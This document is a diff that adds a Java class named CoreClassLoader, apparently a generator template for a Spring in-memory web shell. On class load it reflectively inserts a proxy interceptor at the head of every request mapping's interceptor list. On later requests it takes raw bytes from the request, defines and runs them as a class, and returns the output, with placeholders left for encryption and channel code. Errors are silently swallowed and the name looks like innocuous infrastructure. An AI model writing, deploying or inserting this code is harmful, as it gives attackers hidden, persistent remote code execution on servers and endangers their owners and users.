@@ -1,0 +1,293 @@
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.lang.reflect.*;
+import java.util.ArrayList;
+import java.net.URLEncoder;
+import java.util.List;
+
+@SuppressWarnings("unchecked")
+public class CoreClassLoader extends ClassLoader implements InvocationHandler {
+
+    private Class payload;
+
+    public CoreClassLoader() {
+        super(CoreClassLoader.class.getClassLoader());
+    }
+    
+    public CoreClassLoader(ClassLoader parent) {
+        super(parent);
+    }
+
+    static {
+        try {
+            inject();
+        } catch (Throwable e) {
+        }
+    }
+
+    public static void inject() throws Exception {
+        try {
+            ClassLoader cl = Thread.currentThread().getContextClassLoader();
+            if (cl == null) cl = ClassLoader.getSystemClassLoader();
+            
+            try {
+                Class<?> holder = cl.loadClass("org.springframework.web.context.request.RequestContextHolder");
+                Method m = holder.getMethod("currentRequestAttributes");
+                Object attr = m.invoke(null);
+                Method getReq = attr.getClass().getMethod("getRequest");
+                Object request = getReq.invoke(attr);
+    
+                Class<?> utils = cl.loadClass("org.springframework.web.servlet.support.RequestContextUtils");
+                Class<?> requestClass = null;
+                try {
+                     requestClass = cl.loadClass("javax.servlet.http.HttpServletRequest");
+                } catch(Exception e) {
+                     requestClass = cl.loadClass("jakarta.servlet.http.HttpServletRequest");
+                }
+                
+                Method findContext = utils.getMethod("findWebApplicationContext", requestClass);
+                Object context = findContext.invoke(null, request);
+    
+                Method getBeans = context.getClass().getMethod("getBeansOfType", Class.class);
+                Class<?> mappingClass = cl.loadClass("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
+                java.util.Map mappings = (java.util.Map) getBeans.invoke(context, mappingClass);
+                
+                Class<?> interceptorClass = cl.loadClass("org.springframework.web.servlet.HandlerInterceptor");
+                CoreClassLoader shell = new CoreClassLoader();
+                Object proxy = Proxy.newProxyInstance(
+                    cl,
+                    new Class[]{interceptorClass},
+                    shell
+                );
+    
+                for (Object mapping : mappings.values()) {
+                    Object adaptedInterceptors = getFieldValue(mapping, "adaptedInterceptors");
+                    if (adaptedInterceptors instanceof List) {
+                        List list = (List) adaptedInterceptors;
+                        list.add(0, proxy); 
+                    }
+                }
+            } catch (Exception e) {
+
+            }
+        } catch (Throwable e) {
+        }
+    }
+
+    public static boolean intercept(Object request, Object response) {
+        try {
+            return new CoreClassLoader().entry(request, response);
+        } catch (Throwable e) {
+            return false;
+        }
+    }
+
+    public boolean equals(Object obj) {
+        if (obj instanceof Object[]) {
+            Object[] context = (Object[]) obj;
+            return entry(context[0], context[1]);
+        }
+        return false;
+    }
+
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        if ("preHandle".equals(method.getName())) {
+            if (entry(args[0], args[1])) {
+                return false;
+            }
+            return true;
+        }
+        if ("postHandle".equals(method.getName())) return null;
+        if ("afterCompletion".equals(method.getName())) return null;
+        return null;
+    }
+
+    {globalCode}
+
+    private boolean entry(Object request, Object response) {
+        try {
+                {variable}
+                {requestChannel}
+                {requestDecryptionChain}
+                if (requestData==null || requestData.length==0){
+                    return true;
+                }
+                if (payload == null){
+                    payload = new CoreClassLoader(getClass().getClassLoader()).defineClass(requestData,0,requestData.length);
+                }else {
+                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+                    Object f = payload.newInstance();
+                    f.equals(request);
+                    f.equals(arrOut);
+                    f.equals(requestData);
+                    f.toString();
+                    byte[] responseData = arrOut.toByteArray();
+
+                    if (responseData.length == 0){
+                        return true;
+                    }
+                    arrOut.reset();
+                    
+                    {responseEncryptionChain}
+                    {responseBodyAppendStart}
+                    {responseChannel}
+                    {responseBodyAppendEnd}
+                    try {
+                        OutputStream os = getOutputStream(response);
+                        if(os != null) {
+                            os.flush();
+                            os.close();
+                        }
+                    } catch(Exception e) {}
+                    return true;
+                }
+        } catch (Throwable e) {}
+        return false;
+    }
+
+    public static void setFieldValue(Object obj, String fieldName,Object value) throws Exception {
+        Field f=getField(obj, fieldName);
+        f.setAccessible(true);
+        f.set(obj, value);
+    }
+
+    public static Object invokeMethod(Object obj,String methodName,Object[] parameters){
+        try {
+            ArrayList classes = new ArrayList();
+            if (parameters!=null){
+                for (int i=0;i<parameters.length;i++){
+                    Object o1=parameters[i];
+                    if (o1!=null){
+                        classes.add(o1.getClass());
+                    }else{
+                        classes.add(null);
+                    }
+                }
+            }
+            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));
+
+            return method.invoke(obj, parameters);
+        }catch (Exception e){
+        }
+        return null;
+    }
+
+    public Object invokeMethod(Object obj,String methodName,Class[] parameterTypes,Object[] parameters){
+        Object ret = null;
+        try {
+            Method method = obj.getClass().getMethod(methodName,parameterTypes);
+            if (!method.isAccessible()) {
+                method.setAccessible(true);
+            }
+            ret =  method.invoke(obj,parameters);
+        }catch (Throwable e){
+
+        }
+        return ret;
+    }
+
+    public String getRequestURI(Object request){
+        return (String) invokeMethod(request,"getRequestURI",new Class[0],new Object[0]);
+    }
+    public String getParameter(Object request,String name){
+        return (String) invokeMethod(request,"getParameter",new Class[]{String.class},new Object[]{name});
+    }
+    public String getHeader(Object request,String name){
+        return (String) invokeMethod(request,"getHeader",new Class[]{String.class},new Object[]{name});
+    }
+    public String getCookie(Object request,String name){
+        Object cookies = invokeMethod(request,"getCookies",new Class[]{},new Object[]{});
+        String value = null;
+        if (cookies!=null){
+            int cookieCount = Array.getLength(cookies);
+            for (int i = 0; i < cookieCount; i++) {
+                Object cookie = Array.get(cookies,i);
+                String cookieName = (String) invokeMethod(cookie,"getName",new Class[]{},new Object[]{});
+                if (name.equals(cookieName)){
+                    value = (String)invokeMethod(cookie,"getValue",new Class[]{},new Object[]{});
+                    break;
+                }
+            }
+        }
+        return value;
+    }
+    public String getQueryString(Object request){
+        return (String) invokeMethod(request,"getQueryString",new Class[]{},new Object[]{});
+    }
+    public InputStream getInputStream(Object request){
+        return (InputStream) invokeMethod(request,"getInputStream",new Class[]{},new Object[]{});
+    }
+    public OutputStream getOutputStream(Object response){
+        return (OutputStream) invokeMethod(response,"getOutputStream",new Class[]{},new Object[]{});
+    }
+    public void setHeader(Object response,String name,String value){
+        invokeMethod(response,"setHeader",new Class[]{String.class,String.class},new Object[]{name,value});
+    }
+    public void addHeader(Object response,String name,String value){
+        invokeMethod(response,"addHeader",new Class[]{String.class,String.class},new Object[]{name,value});
+    }
+    public void setStatus(Object response,int code){
+        invokeMethod(response,"setStatus",new Class[]{int.class},new Object[]{code});
+    }
+    public void addCookie(Object response,String name,String value){
+        try {
+            Class cookieClass = null;
+            try {
+                cookieClass = Class.forName("javax.servlet.http.Cookie");
+            } catch (ClassNotFoundException e) {
+                cookieClass = Class.forName("jakarta.servlet.http.Cookie");
+            }
+            if(cookieClass != null) {
+                Constructor cons = cookieClass.getConstructor(String.class, String.class);
+                Object cookie = cons.newInstance(name, value);
+                Method addCookie = response.getClass().getMethod("addCookie", cookieClass);
+                addCookie.invoke(response, cookie);
+            }
+        } catch (Exception e) {
+             addHeader(response,"Set-Cookie",name+"="+ value +"; path=/");
+        }
+    }
+
+    public static Method getMethodByClass(Class cs, String methodName, Class... parameters){
+        Method method=null;
+        while (cs!=null){
+            try {
+                method=cs.getDeclaredMethod(methodName, parameters);
+                cs=null;
+            }catch (Exception e){
+                cs=cs.getSuperclass();
+            }
+        }
+        if (method!=null){
+            method.setAccessible(true);
+        }
+        return method;
+    }
+    public static Object getFieldValue(Object obj, String fieldName) {
+        try {
+            return getField(obj,fieldName).get(obj instanceof Class?null:obj);
+        }catch (Exception e){
+            return null;
+        }
+    }
+    public static Field getField(Object obj,String fieldName){
+        if (obj!=null){
+            Class clazz = null;
+            if (obj instanceof Class){
+                clazz = (Class) obj;
+            }else {
+                clazz = obj.getClass();
+            }
+            while (clazz!=null){
+                try {
+                    Field f=clazz.getDeclaredField(fieldName);
+                    f.setAccessible(true);
+                    return f;
+                }catch (Exception e){
+                    clazz=clazz.getSuperclass();
+                }
+            }
+        }
+        return null;
+    }
+}
